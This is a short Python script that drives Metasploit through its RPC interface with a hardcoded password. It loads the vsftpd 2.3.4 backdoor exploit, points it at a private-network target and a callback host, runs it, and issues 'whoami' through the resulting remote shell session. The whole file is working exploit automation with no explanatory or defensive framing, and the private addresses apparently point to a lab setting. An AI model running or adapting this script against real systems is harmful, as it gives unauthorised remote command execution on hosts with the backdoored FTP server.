from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole

a = MsfRpcClient('JW19ka73', port=55552)
exploit = a.modules.use('exploit', 'exploit/unix/ftp/vsftpd_234_backdoor')
print(exploit.options)
print(exploit.missing_required)

exploit["RHOSTS"] = "10.10.0.14"
exploit["RPORT"] = "21"
exploit['CHOST'] = '10.10.0.12'
exploit['CPORT'] = "4444"

print(exploit["RHOSTS"])

print("TEST:", exploit.options)

for option in exploit.options:
    print(option, exploit[option])

print(exploit.execute())

print(a.sessions.list)

shell = a.sessions.session('1')
shell.write('whoami')
print(shell.read())